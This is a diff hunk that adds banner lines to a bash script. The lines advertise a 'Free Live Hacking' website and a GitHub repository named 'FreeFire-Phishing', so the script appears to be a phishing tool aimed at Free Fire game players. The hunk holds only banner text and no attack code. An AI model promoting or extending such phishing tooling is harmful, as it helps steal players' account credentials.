@@ -214,6 +214,11 @@ echo -e "\e[33m
   ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝╚════╝██╔══╝  ██║██╔══██╗██╔══╝   
   ██║     ██║  ██║███████╗███████╗    ██║     ██║██║  ██║███████╗ 
   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ \e[93;1m v 2.0\e[0m\n"
+  
+echo -e " \e[36mFree Live Hacking : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
+  
+echo -e " \e[36mOriginal GitHub : \e[0m\e[92mhttps://github.com/OnlineHacKing/FreeFire-Phishing \e[0m\n"
+  
 echo -e "\e[95m
          ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
         ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
